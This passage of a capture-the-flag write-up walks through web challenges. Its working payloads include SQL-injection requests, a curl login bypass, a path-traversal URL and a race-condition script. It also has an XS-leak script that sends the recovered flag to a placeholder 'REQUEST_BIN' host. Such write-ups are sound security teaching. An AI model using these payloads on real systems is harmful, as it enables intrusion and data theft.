+        <span style="color:#a6e22e">filledQuery</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">filledQuery</span>.<span style="color:#a6e22e">replaceAll</span>(<span style="color:#e6db74">`:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">key</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#a6e22e">escapedParams</span>[<span style="color:#a6e22e">key</span>]);
+    }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">filledQuery</span>;
+}
+</code></pre></div>
+<p><code>sqlEscape</code> will eat the single quote from your string input (and add a pair of single quote), so changing the username (or asset) to <code>../../health?' blah</code> will not work. No luck? When you see a lot of <code>Objects[key]</code> (having <code>Object[key1][key2]</code> is the best) in a js challenge, you can try prototype pollution:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">assetTransactions</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">transactions</span>[<span style="color:#a6e22e">asset</span>] <span style="color:#f92672">??</span> (<span style="color:#a6e22e">transactions</span>[<span style="color:#a6e22e">asset</span>] <span style="color:#f92672">=</span> {});
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">txId</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">generateId</span>();
+<span style="color:#a6e22e">assetTransactions</span>[<span style="color:#a6e22e">txId</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">action</span>;
+</code></pre></div>
+<p>which is just like <code>transactions[asset][txId] = action;</code> which fits the <code>Object[key1][key2]</code> form, then we can just fill <code>key1</code> as <code>__proto__</code> and we can control <code>asset</code> and <code>action</code> as a string. So we got a prototype pollution on a property of ... a generated ID... but this prototype property will be appeared in <code>escapedParams</code> as well, so if we know the ID (e.g. 1337), then having the username as <code>../../health? :1337</code> with action <code>' blah --</code> will make the SQL statement looks like</p>
+<pre><code>INSERT INTO transactions (id, asset, amount, username) VALUES (1337, &#39;__proto__&#39;, -1, &#39;../../health? &#39; blah --&#39;)</code></pre>
+<p><del>(I know it is broken lol)</del>
+But how can we get the generated ID? You can't before it shows the result... so instead of putting <code>:1337</code> as the placeholder, we can put <code>::txId</code> as the placeholder, so that it will be replaced to the placeholder for the generated ID later.</p>
+
+<p>To sum up:</p>
+
+<ol>
+<li>Get a token with a funny username that contains <code>::txId</code>, e.g.
+<code>../../health? ::txId</code></li>
+<li>Access the <code>/api/priv/</code> endpoint with prototype pollution and SQLi while bypassing the check:
+<code>PUT http://z/api/priv/assets/__proto__/'%7C%7C(select%09flag%09from%09flag)%7C%7C' HTTP/1.1
+Authorization: eySomeToken
+Host: z</code></li>
+<li><del>??</del></li>
+<li><del>Profit</del></li>
+</ol>
+
+<p>Then you can use the <code>/api/transactions/:id</code> endpoint with the generated ID shown in the transaction result to get the flag.</p>
+
+<h2 id="bookmarker-333-14-solves">Bookmarker ($333, 14 solves)<a hidden class="anchor" aria-hidden="true" href="#bookmarker-333-14-solves">#</a></h2>
+
+<p>Note App + XSS Bot again. But apparently there is no XSS. There is a filter function:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">username</span>
+<span style="color:#66d9ef">let</span> {<span style="color:#a6e22e">filter</span>} <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>
+
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">username</span>}
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">filter</span>){
+    <span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">title</span> <span style="color:#f92672">=</span> { <span style="color:#a6e22e">$regex</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">escapeStringRegexp</span>(<span style="color:#a6e22e">filter</span>) }  
+}
+<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">items</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">Links</span>.<span style="color:#a6e22e">find</span>(<span style="color:#a6e22e">query</span>).<span style="color:#a6e22e">sort</span>({<span style="color:#a6e22e">date</span><span style="color:#f92672">:</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>})
+</code></pre></div>
+<p>Regular Expression Filter, ReDoS again? But wait there is <code>escapeStringRegexp</code> which seems to be working well. So we need other oracle to check whether the admin's bookmark title (i.e. the flag) contains certain character. Then I found that there is a subtle difference in <code>index.ejs</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#960050;background-color:#1e0010">&lt;</span>% if(typeof items != &#39;undefined&#39; <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> items.length){ %&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+    window.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> () =&gt; {
+        document.<span style="color:#a6e22e">querySelectorAll</span>(<span style="color:#e6db74">&#39;.deletebtn&#39;</span>).<span style="color:#a6e22e">forEach</span>((<span style="color:#a6e22e">button</span>)=&gt; {
+            <span style="color:#a6e22e">button</span>.<span style="color:#a6e22e">onclick</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">async</span> () =&gt; {
+                <span style="color:#75715e">// delete link with id
+</span><span style="color:#75715e"></span>                <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`/delete?id=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">button</span>.<span style="color:#a6e22e">dataset</span>.<span style="color:#a6e22e">id</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
+                    <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;GET&#39;</span>,
+                    <span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;include&#39;</span>,
+                })
+                .<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">x</span> =&gt; <span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">json</span>())
+                .<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">j</span>) =&gt; {
+                    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">j</span>)
+                })
+                <span style="color:#75715e">// remove from dom
+</span><span style="color:#75715e"></span>                <span style="color:#a6e22e">button</span>.<span style="color:#a6e22e">parentElement</span>.<span style="color:#a6e22e">parentElement</span>.<span style="color:#a6e22e">parentElement</span>.<span style="color:#a6e22e">remove</span>()
+            }
+        })
+    }
+&lt;/<span style="color:#f92672">script</span>&gt;
+<span style="color:#960050;background-color:#1e0010">&lt;</span>% } %&gt;</code></pre></div>
+<p>That means if the query got no results, it won't include the script for deleting link. Now we can add more security protection to the page, and then we can use our favorite censorship oracle (i.e. Streisand effect) to detect what are the interesting information... lol</p>
+
+<p>Not blocked:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://bookmarker.flu.xxx/?filter=not_found&#34;</span> <span style="color:#a6e22e">csp</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;script-src &#39;none&#39;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;</code></pre></div>
+<p>Blocked:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://bookmarker.flu.xxx/?filter=found&#34;</span> <span style="color:#a6e22e">csp</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;script-src &#39;none&#39;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;</code></pre></div>
+<p>The oracle here is the blocked one will be loaded relatively faster. By generating <em>N</em> iframes with <code>onload</code> event, the first triggered event will indicate what is the detected character:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
+&lt;<span style="color:#f92672">head</span>&gt;
+&lt;<span style="color:#f92672">script</span>&gt;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">o</span> <span style="color:#f92672">=</span> {};
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}&#39;</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag{&#39;</span>;
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">load</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">s</span>(){
+        <span style="color:#a6e22e">load</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+        <span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
+                <span style="color:#a6e22e">q</span>(<span style="color:#a6e22e">i</span>);
+        }
+}
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">q</span>(<span style="color:#a6e22e">x</span>){
+        <span style="color:#a6e22e">o</span>[<span style="color:#a6e22e">x</span>] <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;iframe&#39;</span>);
+        <span style="color:#a6e22e">o</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">src</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://bookmarker.flu.xxx/?filter=&#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">payload</span><span style="color:#f92672">+</span><span style="color:#a6e22e">c</span>[<span style="color:#a6e22e">x</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;&amp;&#39;</span><span style="color:#f92672">+</span>Math.<span style="color:#a6e22e">random</span>();
+        <span style="color:#a6e22e">o</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(){eval(<span style="color:#e6db74">`z(`</span><span style="color:#f92672">+</span><span style="color:#a6e22e">x</span><span style="color:#f92672">+</span><span style="color:#e6db74">`);`</span>)};
+        <span style="color:#a6e22e">o</span>[<span style="color:#a6e22e">x</span>].<span style="color:#a6e22e">csp</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;script-src &#39;none&#39;&#34;</span>;
+        document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">appendChild</span>(<span style="color:#a6e22e">o</span>[<span style="color:#a6e22e">x</span>]);
+}
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">z</span>(<span style="color:#a6e22e">x</span>){
+        document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">removeChild</span>(<span style="color:#a6e22e">o</span>[<span style="color:#a6e22e">x</span>]);
+        document.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">load</span>) {
+            <span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">c</span>[<span style="color:#a6e22e">x</span>];
+                <span style="color:#a6e22e">load</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+        }
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">x</span><span style="color:#f92672">!=</span><span style="color:#ae81ff">63</span>){
+                <span style="color:#a6e22e">setTimeout</span>(<span style="color:#e6db74">&#34;s()&#34;</span>,<span style="color:#ae81ff">100</span>);  <span style="color:#75715e">//take a short break lol
+</span><span style="color:#75715e"></span>        }
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">x</span><span style="color:#f92672">==</span><span style="color:#ae81ff">63</span>){
+                <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://REQUEST_BIN/?flag=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">payload</span>, {<span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>});
+        }
+}
+<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">s</span>;
+&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/<span style="color:#f92672">head</span>&gt;
+&lt;<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">body</span>&gt;
+&lt;/<span style="color:#f92672">html</span>&gt;</code></pre></div>
+<p>(Don't ask me how did I name the variables and function names)</p>
+
+<h2 id="diamond-safe-181-61-solves">Diamond Safe ($181, 61 solves)<a hidden class="anchor" aria-hidden="true" href="#diamond-safe-181-61-solves">#</a></h2>
+
+<p>The objective is to read <code>/flag.txt</code>, and first you need to login to the system:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">if (isset($_POST[&#39;password&#39;])){
+    $query = db::prepare(&#34;SELECT * FROM `users` where password=sha1(%s)&#34;, $_POST[&#39;password&#39;]);
+
+    if (isset($_POST[&#39;name&#39;])){
+        $query = db::prepare($query . &#34; and name=%s&#34;, $_POST[&#39;name&#39;]);
+    }</code></pre></div>
+<p>Prepared statement? Let's see how did it prepare:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">public static function prepare($query, $args){
+    if (is_null($query)){
+        return;
+    }
+    if (strpos($query, &#39;%&#39;) === false){
+        error(&#39;%s not included in query!&#39;);
+        return;
+    }
+
+    // get args
+    $args = func_get_args();
+    array_shift( $args );
+
+    $args_is_array = false;
+    if (is_array($args[0]) <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> count($args) == 1 ) {
+        $args = $args[0];
+        $args_is_array = true;
+    }
+
+    $count_format = substr_count($query, &#39;%s&#39;);
+
+    if($count_format !== count($args)){
+        error(&#39;Wrong number of arguments!&#39;);
+        return;
+    }
+    // escape
+    foreach ($args as <span style="color:#960050;background-color:#1e0010">&amp;</span>$value){
+        $value = static::$db-&gt;real_escape_string($value);
+    }
+
+    // prepare
+    $query = str_replace(&#34;%s&#34;, &#34;&#39;%s&#39;&#34;, $query);
+    $query = vsprintf($query, $args);
+    return $query;
+
+}</code></pre></div>
+<p>Since the statement is prepared twice (one for the password and the other one for username), obviously it is format string placeholder injection. Typically it is injecting <code>%c</code> with value 39 to add one more single quote to break everything, but the above <code>prepare</code> function also checks whether the number of <code>%s</code> and the number of arguments supplied match, so we need to inject another <code>%s</code> if we want to make sure the <code>vsprintf</code> works later.</p>
+
+<p>First, the statement looks like this before <code>prepare</code> on password:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> <span style="color:#f92672">`</span>users<span style="color:#f92672">`</span> <span style="color:#66d9ef">where</span> password<span style="color:#f92672">=</span>sha1(<span style="color:#f92672">%</span>s)</code></pre></div>
+<p>Let's just set the password as <code>%s</code>, then it will become like this after the vsprintf:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> <span style="color:#f92672">`</span>users<span style="color:#f92672">`</span> <span style="color:#66d9ef">where</span> password<span style="color:#f92672">=</span>sha1(<span style="color:#e6db74">&#39;%s&#39;</span>)</code></pre></div>
+<p>Looks no difference? See where are the single quotes...</p>
+
+<p>Then we have another prepare statement for the username. Before it <code>prepare</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> <span style="color:#f92672">`</span>users<span style="color:#f92672">`</span> <span style="color:#66d9ef">where</span> password<span style="color:#f92672">=</span>sha1(<span style="color:#e6db74">&#39;%s&#39;</span>) <span style="color:#66d9ef">and</span> name<span style="color:#f92672">=%</span>s</code></pre></div>
+<p>Now you should see what went wrong. Let's say we supply the username as <code>['foo','bar']</code>, the statement will become:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> <span style="color:#f92672">`</span>users<span style="color:#f92672">`</span> <span style="color:#66d9ef">where</span> password<span style="color:#f92672">=</span>sha1(<span style="color:#e6db74">&#39;&#39;</span>foo<span style="color:#e6db74">&#39;&#39;</span>) <span style="color:#66d9ef">and</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;bar&#39;</span></code></pre></div>
+<p>Looks broken isn't it? Then it is like SQLi 101, just change the foo to some interesting things like <code>) or 1 --</code>, then you can login:</p>
+<pre><code>curl https://diamond-safe.flu.xxx/login.php -d &#34;name[]=) or 1 -- &amp;name[]=1&amp;password=%s&#34; -i</code></pre>
+<p>Next, we want to download the flag. But there is an integrity check on the filename with the hash:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">function check_url(){
+    // fixed bypasses with arrays in get parameters
+    $query  = explode(&#39;<span style="color:#960050;background-color:#1e0010">&amp;</span>&#39;, $_SERVER[&#39;QUERY_STRING&#39;]);
+    $params = array();
+    foreach( $query as $param ){
+        // prevent notice on explode() if $param has no &#39;=&#39;
+        if (strpos($param, &#39;=&#39;) === false){
+            $param += &#39;=&#39;;
+        }
+        list($name, $value) = explode(&#39;=&#39;, $param, 2);
+        $params[urldecode($name)] = urldecode($value);
+    }
+
+    if(!isset($params[&#39;file_name&#39;]) or !isset($params[&#39;h&#39;])){
+        return False;
+    }
+
+    $secret = getenv(&#39;SECURE_URL_SECRET&#39;);
+    $hash = md5(&#34;{$secret}|{$params[&#39;file_name&#39;]}|{$secret}&#34;);
+
+    if($hash === $params[&#39;h&#39;]){
+        return True;
+    }
+    return False;
+    
+}</code></pre></div>
+<p>Why use the query string instead of <code>$_GET</code>... Looks like a bad excuse for the comment. Anyway we can just keep the original <code>file_name</code> and <code>h</code> in the query string for a valid file, and then add something that can replace the <code>$_GET['file_name']</code>. One way is <code>file name</code> as PHP replaces space with underscore from query string to <code>$_GET</code>:</p>
+<pre><code>https://diamond-safe.flu.xxx/download.php?h=f2d03c27433d3643ff5d20f1409cb013&amp;file_name=FlagNotHere.txt&amp;file%20name=../../../flag.txt</code></pre>
+<h2 id="nodenb-198-45-solves">NodeNB ($198, 45 solves)<a hidden class="anchor" aria-hidden="true" href="#nodenb-198-45-solves">#</a></h2>
+
+<p>The objective is to read the note with id <code>flag</code>. However, there is an authorization and you are allowed to read the flag only if either</p>
+
+<ol>
+<li>you are the owner of the note (there are no owners for the note <code>flag</code>), or</li>
+<li>you do not have a password (this happens only if you are a system user).</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">async</span> <span style="color:#a6e22e">deleteUser</span>(<span style="color:#a6e22e">uid</span>) {
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">helpers</span>.<span style="color:#a6e22e">getUser</span>(<span style="color:#a6e22e">uid</span>);
+    <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">`user:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">name</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+    <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">del</span>(<span style="color:#e6db74">`uid:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">uid</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+    <span style="color:#75715e">// ☝️ Deletes the entire user. The user does not have a password now.
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sessions</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">smembers</span>(<span style="color:#e6db74">`uid:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">uid</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:sessions`</span>);
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">notes</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">smembers</span>(<span style="color:#e6db74">`uid:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">uid</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:notes`</span>);
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">del</span>([
+        ...<span style="color:#a6e22e">sessions</span>.<span style="color:#a6e22e">map</span>((<span style="color:#a6e22e">sid</span>) =&gt; <span style="color:#e6db74">`sess:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">sid</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>),
+        <span style="color:#75715e">// ☝️ The sessions are invalidated here
+</span><span style="color:#75715e"></span>        ...<span style="color:#a6e22e">notes</span>.<span style="color:#a6e22e">map</span>((<span style="color:#a6e22e">nid</span>) =&gt; <span style="color:#e6db74">`note:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">nid</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>),
+        <span style="color:#e6db74">`uid:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">uid</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:sessions`</span>,
+        <span style="color:#e6db74">`uid:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">uid</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:notes`</span>,
+    ]);
+},
+</code></pre></div>
+<p><em>Mystiz</em> observed that there is a gap between deleting the user and invalidating the sessions. A user can read arbitrary notes during the time in between. To achieve this, he tried to increase the time by inserting a lot of notes (he attempted to make 1024 notes) and delete the user. Unfortunately he was unable to cast the attack.</p>
+
+<p>Actually there is a sleep function in one of the endpoint that could help us to conduct the race condition attack:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/notes&#39;</span>, <span style="color:#a6e22e">ensureAuth</span>, <span style="color:#a6e22e">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+    <span style="color:#66d9ef">let</span> { <span style="color:#a6e22e">title</span>, <span style="color:#a6e22e">content</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">random</span>) {
+        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ms</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">floor</span>(<span style="color:#ae81ff">2000</span> <span style="color:#f92672">+</span> Math.<span style="color:#a6e22e">random</span>() <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>);
+        <span style="color:#a6e22e">await</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">r</span>, <span style="color:#a6e22e">ms</span>));
+</code></pre></div>
+<p>So instead of inserting tons of notes (which should work theoretically if the amount is very large), we can just request a few random notes that will sleep for a while. Then we can run delete and read at the same time:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#ae81ff">100</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/notes?random=1&#39;</span>,{<span style="color:#e6db74">&#39;method&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;POST&#39;</span>,<span style="color:#e6db74">&#39;headers&#39;</span><span style="color:#f92672">:</span>{<span style="color:#e6db74">&#39;content-type&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>},<span style="color:#e6db74">&#39;body&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;title=&#39;</span><span style="color:#f92672">+</span>Math.<span style="color:#a6e22e">random</span>()})};
+<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/deleteme&#39;</span>,{<span style="color:#e6db74">&#39;method&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;POST&#39;</span>});
+<span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/notes/flag&#39;</span>).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">e</span>=&gt;<span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">text</span>()).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">e</span>=&gt;<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">e</span>));
+</code></pre></div>
+<h2 id="seekingexploits-367-11-solves">SeekingExploits ($367, 11 solves)<a hidden class="anchor" aria-hidden="true" href="#seekingexploits-367-11-solves">#</a></h2>
+
+<p>The challenge is written based on an open source forum, MyBB. A plugin called <em>ExploitMarket</em> is implemented. There are two APIs implemented:</p>
+
+<ol>
+<li><code>make_proposal</code> makes a proposal</li>
+<li><code>delete_proposals</code> clears the proposal of the current user.</li>
+</ol>
+
+<p>Additionally, when a user sends a private message to another user, the list of proposals will be included as a signature.</p>
+
+<p>The flag is hidden inside the database. It is hidden in the private notes of the admin. That said, we need to either sign in as an admin (which sounds infeasible for a public CMS) or perform SQL injection.</p>
+
+<p>In <code>mybb-server/exploit_market/inc/plugins/emarket.php</code>, there is an obvious SQL injection:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$user_query = $db-&gt;simple_select(&#34;users&#34;, &#34;username&#34;, &#34;uid=&#34; . $proposal[&#34;additional_info&#34;][&#39;sold_to&#39;]);</code></pre></div>
+<p><code>additional_info</code> is unserialized with <code>my_unserialize</code> and <code>sold_to</code> is used directly without validation. That said, if <code>sold_to</code> is a string, we can easily craft an SQL injection easily (the <code>insert_query</code> function in MyBB simply concatenates the function parameters).</p>
+
+<p>Unfortunately the fields in <code>additional_info</code> are validated when the content is added. Snippeted:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">function validate_additional_info($additional_info) {
+    $validated = array();
+    foreach($additional_info as $key =&gt; $value) {
+        switch ($key) {
+            case &#34;reliability&#34;: {
+                $value = (int)$value;
+                if ($value &gt;= 0 <span style="color:#960050;background-color:#1e0010">&amp;&amp;</span> $value <span style="color:#960050;background-color:#1e0010">&lt;</span>= 100) {
+                    $validated[&#34;reliability&#34;] = $value;
+                }
+                break;
+            }
+            case &#34;impact&#34;: {
+                $valid_impacts = array(&#34;rce&#34;, &#34;priv_esc&#34;, &#34;information_disclosure&#34;);
+                if (in_array($value, $valid_impacts, true)) {
+                    $validated[&#34;impact&#34;] = $value;
+                }
+                break;
+            }
+            case &#34;current_bidding&#34;:
+            case &#34;sold_to&#34;: {
+                $validated[$key] = (int)$value;
+                break;
+            }
+            default: {
+                $validated[$key] = $value;
+            }
+        }
+    }
+
+    return $validated;
